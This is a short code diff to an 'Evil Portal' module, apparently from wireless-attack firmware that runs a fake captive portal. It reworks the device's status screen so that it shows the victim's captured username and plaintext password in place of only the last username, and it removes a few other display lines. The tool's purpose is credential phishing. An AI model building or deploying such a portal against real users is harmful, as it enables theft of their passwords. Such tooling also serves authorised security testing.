@@ -485,9 +485,8 @@ void EvilPortal::startAP() {
   #ifndef MARAUDER_V8
     Serial.println(F("Evil Portal READY"));
   #endif
-  #ifdef HAS_SCREEN
-    this->sendToDisplay(F("Evil Portal READY"));
-  #endif
+  // Status is shown on the live portal HUD (drawPortalStatus); don't queue a
+  // sticky console line, it would repaint over the HUD.
 }
 
 void EvilPortal::startPortal() {
@@ -551,8 +550,8 @@ void EvilPortal::main(uint8_t scan_mode) {
     buffer_obj.append(line);
 
     // Feed the live status HUD instead of scrolling a console line over it.
+    // user_name / password already hold the just-captured values.
     this->num_creds++;
-    this->last_cred = this->user_name;
   }
 
   #ifdef HAS_SCREEN
@@ -609,9 +608,6 @@ void EvilPortal::drawPortalStatus() {
 
   line(String("SSID: ") + apName, TFT_WHITE, y); y += lh;
   line(String("Page: ") + this->target_html_name, TFT_CYAN, y); y += lh;
-  #ifndef HAS_MINI_SCREEN
-    line(String("Clients: ") + (int)WiFi.softAPgetStationNum(), TFT_WHITE, y); y += lh;
-  #endif
 
   y += 2;
   display_obj.tft.drawFastHLine(pad, y, W - 2 * pad, TFT_DARKGREY);
@@ -645,9 +641,10 @@ void EvilPortal::drawPortalStatus() {
   display_obj.tft.setTextDatum(TL_DATUM);
   y += lh;
 
-  // Last captured identity.
+  // Last captured credential (what the victim typed).
   if (this->num_creds > 0) {
-    line(String("last: ") + this->last_cred, TFT_DARKGREY, y);
+    line(String("user: ") + this->user_name, TFT_CYAN, y); y += lh;
+    line(String("pass: ") + this->password, TFT_WHITE, y); y += lh;
   }
 }
 #endif
